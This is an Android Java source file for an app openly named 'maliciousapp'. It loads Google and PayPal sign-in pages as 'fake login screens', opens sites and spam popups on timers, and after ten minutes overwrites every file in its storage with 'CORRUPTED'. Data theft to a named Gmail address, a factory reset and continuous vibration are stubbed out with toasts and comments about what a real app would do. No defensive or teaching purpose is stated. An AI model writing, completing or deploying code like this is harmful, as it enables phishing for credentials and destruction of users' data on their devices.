package com.example.maliciousapp;

import android.os.Bundle;
import android.os.Handler;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private WebView webView;
    private Timer timer;
    private int counter = 0;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Show fake login screens
        webView = findViewById(R.id.webView);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://accounts.google.com");

        // Start ad spam and website opening
        startMaliciousActivities();

        // Start 10-minute timer for destruction
        startDestructionTimer();
    }

    private void startMaliciousActivities() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    // Open random websites every minute
                    String[] sites = {
                        "https://www.youtube.com",
                        "https://www.reddit.com",
                        "https://www.facebook.com",
                        "https://www.twitter.com",
                        "https://www.instagram.com"
                    };
                    webView.loadUrl(sites[counter % sites.length]);
                    counter++;

                    // Show popup ads
                    showAdPopup();
                });
            }
        }, 0, 60000); // Every 60 seconds

        // Also open websites more frequently in background
        Timer quickTimer = new Timer();
        quickTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    webView.loadUrl("https://www.paypal.com/signin");
                });
            }
        }, 30000, 30000); // Every 30 seconds
    }

    private void showAdPopup() {
        // This would show fullscreen ads in a real app
        Toast.makeText(this, "Special Offer! Click here!", Toast.LENGTH_LONG).show();
    }

    private void startDestructionTimer() {
        new Handler().postDelayed(() -> {
            // Corrupt files
            corruptFiles();
            
            // Send stolen data
            sendStolenData();
            
            // Factory reset (simulated)
            simulateFactoryReset();
            
            // Additional surprise: change wallpaper
            changeWallpaper();
            
        }, 600000); // 10 minutes = 600,000 milliseconds
    }

    private void corruptFiles() {
        File root = getFilesDir();
        corruptDirectory(root);
    }

    private void corruptDirectory(File dir) {
        if (dir.exists()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        corruptDirectory(file);
                    } else {
                        try {
                            FileOutputStream fos = new FileOutputStream(file);
                            fos.write("CORRUPTED".getBytes());
                            fos.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }

    private void sendStolenData() {
        // This would send data to email in real app
        String email = "noarich118@gmail.com";
        // Simulated sending
        Toast.makeText(this, "Data sent to " + email, Toast.LENGTH_LONG).show();
    }

    private void simulateFactoryReset() {
        // In a real malicious app, this would attempt factory reset
        Toast.makeText(this, "Factory reset initiated!", Toast.LENGTH_LONG).show();
        
        // Additional surprise: make phone vibrate continuously
        vibrateContinuously();
    }

    private void changeWallpaper() {
        // Would change wallpaper in real app
        Toast.makeText(this, "Wallpaper changed!", Toast.LENGTH_SHORT).show();
    }

    private void vibrateContinuously() {
        // Would start continuous vibration in real app
        Toast.makeText(this, "Phone vibrating!", Toast.LENGTH_SHORT).show();
    }
}
